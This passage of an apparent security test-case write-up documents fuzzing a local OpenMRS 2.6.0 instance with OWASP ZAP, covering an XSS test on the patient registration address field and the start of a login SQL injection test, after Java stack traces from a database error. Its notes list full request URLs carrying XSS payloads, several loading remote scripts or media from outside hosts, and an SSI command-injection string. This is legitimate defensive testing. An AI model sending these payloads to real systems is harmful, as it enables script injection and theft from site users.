	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:72)
	at org.openmrs.module.owa.filter.OwaFilter.doFilter(OwaFilter.java:64)
	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:70)
	at org.openmrs.module.web.filter.ModuleFilter.doFilter(ModuleFilter.java:54)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.OpenmrsFilter.doFilterInternal(OpenmrsFilter.java:108)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.orm.hibernate4.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:150)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:409)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1044)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:315)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
</pre>

<h2>Full Error</h2>
<pre>org.springframework.dao.DataIntegrityViolationException: could not execute batch; SQL [insert into user_property (user_id, property, property_value) values (?, ?, ?)]; constraint [null]; nested exception is org.hibernate.exception.ConstraintViolationException: could not execute batch
	at org.springframework.orm.hibernate4.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:163)
	at org.springframework.orm.hibernate4.HibernateTransactionManager.convertHibernateAccessException(HibernateTransactionManager.java:730)
	at org.springframework.orm.hibernate4.HibernateTransactionManager.doCommit(HibernateTransactionManager.java:592)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:757)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:726)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.completeTransactionAfterThrowing(TransactionAspectSupport.java:553)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:285)
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)
	at com.sun.proxy.$Proxy290.authenticate(Unknown Source)
	at org.openmrs.api.context.UserContext.authenticate(UserContext.java:100)
	at org.openmrs.api.context.Context.authenticate(Context.java:297)
	at org.openmrs.module.referenceapplication.page.controller.LoginPageController.post(LoginPageController.java:217)
	at sun.reflect.GeneratedMethodAccessor542.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.openmrs.ui.framework.UiFrameworkUtil.invokeMethodWithArguments(UiFrameworkUtil.java:112)
	at org.openmrs.ui.framework.UiFrameworkUtil.executeControllerMethod(UiFrameworkUtil.java:71)
	at org.openmrs.ui.framework.page.PageFactory.handleRequestWithController(PageFactory.java:219)
	at org.openmrs.ui.framework.page.PageFactory.processThisFragment(PageFactory.java:160)
	at org.openmrs.ui.framework.page.PageFactory.process(PageFactory.java:116)
	at org.openmrs.ui.framework.page.PageFactory.handle(PageFactory.java:86)
	at org.openmrs.module.uiframework.PageController.handlePath(PageController.java:116)
	at org.openmrs.module.uiframework.PageController.handleUrlWithDotPage(PageController.java:83)
	at sun.reflect.GeneratedMethodAccessor540.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:749)
	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:487)
	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:412)
	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:339)
	at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:168)
	at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303)
	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1228)
	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1011)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:955)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.module.web.filter.ForcePasswordChangeFilter.doFilter(ForcePasswordChangeFilter.java:60)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.GZIPFilter.doFilterInternal(GZIPFilter.java:64)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:72)
	at org.openmrs.module.owa.filter.OwaFilter.doFilter(OwaFilter.java:64)
	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:70)
	at org.openmrs.module.web.filter.ModuleFilter.doFilter(ModuleFilter.java:54)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.OpenmrsFilter.doFilterInternal(OpenmrsFilter.java:108)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.orm.hibernate4.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:150)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:409)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1044)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:315)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
Caused by: org.hibernate.exception.ConstraintViolationException: could not execute batch
	at org.hibernate.exception.internal.SQLStateConversionDelegate.convert(SQLStateConversionDelegate.java:129)
	at org.hibernate.exception.internal.StandardSQLExceptionConverter.convert(StandardSQLExceptionConverter.java:49)
	at org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:126)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.performExecution(BatchingBatch.java:136)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.doExecuteBatch(BatchingBatch.java:114)
	at org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl.execute(AbstractBatchImpl.java:163)
	at org.hibernate.engine.jdbc.internal.JdbcCoordinatorImpl.executeBatch(JdbcCoordinatorImpl.java:226)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:484)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:351)
	at org.hibernate.event.internal.AbstractFlushingEventListener.performExecutions(AbstractFlushingEventListener.java:350)
	at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:56)
	at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1258)
	at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:425)
	at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101)
	at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:177)
	at org.springframework.orm.hibernate4.HibernateTransactionManager.doCommit(HibernateTransactionManager.java:584)
	... 107 more
Caused by: java.sql.BatchUpdateException: Duplicate entry '1-lockoutTimestamp' for key 'PRIMARY'
	at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:2055)
	at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1467)
	at com.mchange.v2.c3p0.impl.NewProxyPreparedStatement.executeBatch(NewProxyPreparedStatement.java:1135)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.performExecution(BatchingBatch.java:127)
	... 119 more
Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '1-lockoutTimestamp' for key 'PRIMARY'
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
	at com.mysql.jdbc.Util.getInstance(Util.java:386)
	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1041)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4237)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4169)
	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2617)
	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2778)
	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2825)
	at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:2156)
	at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2441)
	at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:2007)
	... 122 more
</pre>
```
# Fuzz -2- PATIENT REGISTRATION PAGE XSS
### Priority : HIGH
### Test status : PASSED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS Patient registration 
+ Page location : http://localhost:8081/openmrs-standalone/registrationapp/registerPatient.page
+ Fuzz string : http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=[fuzzdata]&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=
+ Fuzz data : jbrofuzz pre-installed rules in OWASP scanner
Fuzzer will deploy 223 Cross-site scripting attack strings on the variable "address1" in form of POST requests. Server HttpResponses will be analyzed and be decided if the attacks were successful or not.

### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally

### * Test Data
jbrofuzz XSS rules came standard with OWASP Zap

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open OWASP Zap V2.6.0
3. From OWASP Zap, go to Toos > Launch the Zap JxBrowser
4. In the Zap JxBrowser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
5. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the JzBrowser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

6. Go back to the Zap JxBrowser and login with Username: admin and Password : Admin123 (password is case sensitive) and select "Pharmacy" as section.
7. After logged in, choose "Register a patient"
8. Fill out patient information as followed
Demographics:
- Name: Lawren Jennifer
- Gender: Female
- Birthdate: Estimate years : 25 / Estimate months : 1
- Address: Fuzz Fuzz Fuzz Fuzz
- Address2: bogus
- City: Hollywood
- State: CA / Country: USA / Postal Code: 00000
- Phone: 408 804 4488
- Relatives: Doctor / Nguyen
9. Confirm the information - Click "Confirm". Close JxBrowser window and get back to main Zap window

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/patientInfo.png)

10. In zap window, if you see "registrationapp" on the left panel (the "Sites" panel) then you got it, if not, please repeat step 3 to 8
11. Expand "registrationapp", then expand "registerPatient", and select "GET:submit.action(,address1, address2appid, birthdate..."
12. The right panel will turn into 2 smaller panels. At the top panel, you will see the HTML header of the GET request sent when registering for the patient. Look for the "Fuzz+Fuzz+Fuzz+Fuzz" string.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/locateFuzzFuzz.png)

9. Highlight the "Fuzz+Fuzz+Fuzz+Fuzz" part from the string you got in previous step, right click on it and choose "Fuzz". A Fuzzer window will be opened.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzWindow.png)

10. In the fuzzer window, click "Payloads..." button. A child window will be opened
11. In the child "Payloads" window, click "Add". An "Add payload" window will be opened
12. In "Add payload window, in the "Type" box, choose "File Fuzzers". Expand the "jbrofuzz" section. Check the box of "XSS" and click "Add". The child window will be closed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/patientInfo.png)

13. In Payloads window, click "OK" and you will be returned to the "Fuzzer" window. In this window, click "Start Fuzzer" button and you will be returned to the main Zap window with the "Fuzzer" tab selected
14. Observe the results in the "Fuzzer" tab, especially the "Code" collumn. You will see that some payloads got through by noticing html code 200. Select one fuzz entry with status code 200 and observe the HtmlResponse information. We will see that the system actually let the fuzzer register a patient with mallicious payloads, noting the OpenMRS responded with a "success" status and a new patient ID.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzResults.png)

15. Open your regular browser, login with admin as username and "Admin123" as password. Go to http://localhost:8081/openmrs-standalone/coreapps/findpatient/findPatient.page?app=coreapps.findPatient
16. Type in either "Jennifer Lauren" and you will see that besides the original "Jennifer Lauren" that we created, there are bogus entries (31) that were created successfully by the fuzzer. We can then verify each bogus entry by clicking on each one, and expand the "show contact info" to see if mallicious code can be executed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzVerification.png)


### * Expected results
+ System fail securely
+ No user should be created successfully with mallicious payload as input OR if a user was created with mallicious inputs, contents of mallicious payloads must be deleted or escaped as plain text.

### * Post-condition
OpenMRS should still be operate normally

### * Actual results
+ 223 attacks were performed
+ Around 31 attacks got accepted by the system, the rest were recognized and denied by 400 code
+ Around 31 new patients with the same name "Jennifer Lawren" were created but all mallicious payloads were escaped/deletted.
+ 08 failed attacks were responded with HibernateException messages. However, since the deployment of Hybernate is open knowledge and the error messages did not reveal any important information about the error, we decided that those cases were "failed secure" cases. URLs of the cases are included in the Notes section for further inspections.

### * NOTES:
URL requests that caused HibernateException errors.
```
http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;IMG%20STYLE&%2361;&%2334;xss&%2358;expr&%2347;&%2342;XSS&%2342;&%2347;ession&%2340;alert&%2340;&%2339;XSS&%2339;&%2341;&%2341;&%2334;&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;STYLE&%2362;&%2364;import&%2339;http&%2358;&%2347;&%2347;testsite.com&%2347;xss.css&%2339;&%2359;&%2360;&%2347;STYLE&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;IMG%20SRC&%2361;&%2334;jav&%2338;&%2335;x0D&%2359;ascript&%2358;alert&%2340;&%2339;XSS&%2339;&%2341;&%2359;&%2334;&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3C!--%23exec%20cmd=%22/bin/echo%20'%3CSCRIPT%20SRC'%22--%3E%3C!--%23exec%20cmd=%22/bin/echo%20'=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E'%22--%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=httP://aa%22%3E%3Cscript%3Ealert(123)%3C/script%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3CEMBED%20SRC=%22http://ha.ckers.org/xss.swf%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3CSCRIPT/XSS%20SRC=%22http://ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=res://c:%5C%5Cprogram%20files%5C%5Cadobe%5C%5Cacrobat%207.0%5C%5Cacrobat%5C%5Cacrobat.dll/%232/%23210&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=
```
# Fuzz -3- LOGIN PAGE SQL INJECTION
### Priority : HIGH
### Test status : FAILED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Fuzz string : username=admin&password=[fuzz data]&sessionLocation=2&redirectUrl=
+ Fuzz data : jbrofuzz pre-installed rules in OWASP scanner
Fuzzer will deploy 169 SQL injection attack strings on the variable "password" in form of POST requests. Server HttpResponses will be analyzed and be decided if the attacks were successful or not.


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally

### * Test Data
jbrofuzz rules came standard with OWASP Zap

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open OWASP Zap V2.6.0
3. From OWASP Zap, go to Toos > Launch the Zap JxBrowser
4. In the Zap JxBrowser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
5. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the JzBrowser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

6. Go back to the Zap JxBrowser and type a bogus pair of username/password (we use "admin" for username and "BBBBB" for password), select "Pharmacy" section and click login. When the page got reloaded with "Invalid username/password. Please try again", close JxBrowser window and get back to main Zap window

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/adminLoginScreen.png)

